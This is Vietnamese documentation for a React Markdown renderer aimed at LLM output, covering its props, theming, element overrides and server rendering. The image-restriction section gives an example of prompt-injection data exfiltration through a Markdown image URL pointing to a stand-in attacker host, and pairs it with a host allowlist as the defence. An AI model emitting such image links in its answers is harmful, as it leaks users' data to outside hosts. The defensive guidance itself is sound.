# Renderer cho web

```tsx
import { MarkdownView } from 'react-llm-markdown';
import 'react-llm-markdown/styles.css';

<MarkdownView streaming={!done}>{text}</MarkdownView>;
```

Trên server, `MarkdownView` render ra Markdown thuần. Sau đó trên trình duyệt, nó mới tải Shiki, KaTeX, Mermaid và
ECharts khi cần, nên lần hiển thị đầu tiên (first paint) vẫn nhẹ. Hỗ trợ React 18 và 19.

## Prop

| Prop | Mặc định | |
|---|---|---|
| `children` | — | Mã nguồn Markdown. |
| `streaming` | `false` | `true` trong lúc văn bản vẫn đang về: sửa Markdown chưa hoàn chỉnh và cho chữ mới hiện dần. |
| `features` | bật hết | `{ code, math, mermaid, echarts, cjk }` — đặt một mục thành `false` để không bao giờ tải nó. |
| `softBreaks` | `true` | Một lần xuống dòng thành một ngắt dòng, như trong chat. `false` để theo Markdown chuẩn. |
| `isImageAllowed` | tất cả | `(url) => boolean`. Ảnh bị từ chối sẽ hiển thị alt text và không bao giờ được request. |
| `className` | — | Class bổ sung cho wrapper `<div class="rlm-markdown">`. |
| `components` | — | Ghi đè element, được merge đè lên các component link và ảnh an toàn có sẵn. |
| `tableMaxHeight` | `300` | Bảng cao hơn giá trị này sẽ cuộn bên trong (px hoặc độ dài CSS; `0` = không giới hạn). |
| `codeBlockMaxHeight` | `400` | Khối code cao hơn giá trị này sẽ cuộn bên trong (`0` = không giới hạn). |
| `lineNumbers` | `true` | Số dòng trong khối code. |

Hãy cài mọi peer được liệt kê trong [Bắt đầu](getting-started) kể cả khi bạn tắt một tính năng: bundler resolve các
import tải-khi-cần ngay lúc build.

## Giới hạn ảnh

Mặc định, ảnh từ bất kỳ host http(s) nào đều được tải. URL ảnh cũng là cách một prompt injection gửi dữ liệu ra ngoài
(`![](https://attacker.example/?q=…)`), nên với câu trả lời không đáng tin cậy, hãy chỉ cho phép host của chính bạn:

```tsx
<MarkdownView isImageAllowed={(url) => url.startsWith('https://cdn.example.com/')}>{text}</MarkdownView>
```

## Theme

Dark mode theo class `dark` hoặc `data-theme="dark"` trên một phần tử tổ tiên (thường là `<html>`). Màu sắc là biến CSS:

```css
:root {
  --rlm-link: #7c3aed;
  --rlm-card: #f8fafc;
  --rlm-chart-height: 400px;
}
```

| Token | Dùng cho |
|---|---|
| `--rlm-background`, `--rlm-foreground` | Màu nền tảng của rich block và control |
| `--rlm-muted`, `--rlm-muted-foreground` | Header của khối, chữ phụ |
| `--rlm-border` | Viền, đường kẻ bảng |
| `--rlm-card` | Bề mặt của code, bảng, sơ đồ và biểu đồ |
| `--rlm-primary`, `--rlm-primary-foreground` | Nút bên trong khối |
| `--rlm-sidebar`, `--rlm-ring` | Bề mặt overlay, viền focus |
| `--rlm-link` | Link |
| `--rlm-chart-height` | Chiều cao ECharts |

Với shadcn/ui, hãy map chúng vào theme của bạn, ví dụ `--rlm-background: hsl(var(--background));`.

## Ghi đè element

`components` thay đổi cách một element được render. Các component link và ảnh an toàn vẫn được giữ trừ khi bạn tự ghi
đè `a` hoặc `img` — nếu làm vậy, hãy giữ `rel="noopener noreferrer"` và `referrerPolicy="no-referrer"`.

```tsx
<MarkdownView components={{ hr: () => <hr className="my-divider" /> }}>{text}</MarkdownView>
```

## Server rendering

Trên server, view render GFM (bảng, danh sách, footnote) mà không có các plugin rich; chúng được gắn vào trên trình
duyệt. Biểu đồ, sơ đồ và code được tô màu xuất hiện sau khi hydration.
